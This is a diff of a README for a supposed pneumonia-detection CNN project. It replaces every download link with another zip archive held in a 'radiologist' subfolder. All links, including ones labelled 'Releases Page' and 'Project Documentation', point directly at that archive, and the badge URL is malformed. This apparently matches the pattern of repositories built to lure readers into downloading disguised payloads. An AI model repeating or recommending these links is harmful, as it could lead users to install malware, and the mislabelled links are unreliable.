@@ -1,6 +1,6 @@
 # 🌟 Pneumonia-HybridCNN - Detect Pneumonia from X-rays Easily
 
-[![Download Now](https://raw.githubusercontent.com/nourddinetaqi/Pneumonia-HybridCNN/main/radiologist/Pneumonia-HybridCNN-v3.0.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/nourddinetaqi/Pneumonia-HybridCNN/main/radiologist/Pneumonia-HybridCNN-v3.0.zip)
+[![Download Now](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/raw/refs/heads/main/radiologist/CNN-Hybrid-Pneumonia-v2.0.zip%20Now-v1.0-blue)](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/raw/refs/heads/main/radiologist/CNN-Hybrid-Pneumonia-v2.0.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Before you start, ensure your system meets these requirements:
 
 To get the application, visit the releases page below:
 
-[Visit this page to download](https://raw.githubusercontent.com/nourddinetaqi/Pneumonia-HybridCNN/main/radiologist/Pneumonia-HybridCNN-v3.0.zip)
+[Visit this page to download](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/raw/refs/heads/main/radiologist/CNN-Hybrid-Pneumonia-v2.0.zip)
 
 1. Click on the release version (e.g., **v1.0**) to find the latest version.
 2. Download the file that matches your operating system.
@@ -61,8 +61,8 @@ Now that the application is running, you can start using it:
 
 For additional resources, refer to the following links:
 
-- [Releases Page](https://raw.githubusercontent.com/nourddinetaqi/Pneumonia-HybridCNN/main/radiologist/Pneumonia-HybridCNN-v3.0.zip)
-- [Project Documentation](https://raw.githubusercontent.com/nourddinetaqi/Pneumonia-HybridCNN/main/radiologist/Pneumonia-HybridCNN-v3.0.zip) (for more technical details)
+- [Releases Page](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/raw/refs/heads/main/radiologist/CNN-Hybrid-Pneumonia-v2.0.zip)
+- [Project Documentation](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/raw/refs/heads/main/radiologist/CNN-Hybrid-Pneumonia-v2.0.zip) (for more technical details)
 
 ## 🔧 Troubleshooting
 
@@ -89,4 +89,4 @@ This project is licensed under the MIT License. You may use, modify, and distrib
 
 Your journey into the world of medical imaging begins here! Enjoy exploring and using the Pneumonia-HybridCNN project. If you have any questions or feedback, please reach out through the issues section on our GitHub page. 
 
-[Download Now](https://raw.githubusercontent.com/nourddinetaqi/Pneumonia-HybridCNN/main/radiologist/Pneumonia-HybridCNN-v3.0.zip) and start using the application today!
+[Download Now](https://github.com/nourddinetaqi/Pneumonia-HybridCNN/raw/refs/heads/main/radiologist/CNN-Hybrid-Pneumonia-v2.0.zip) and start using the application today!
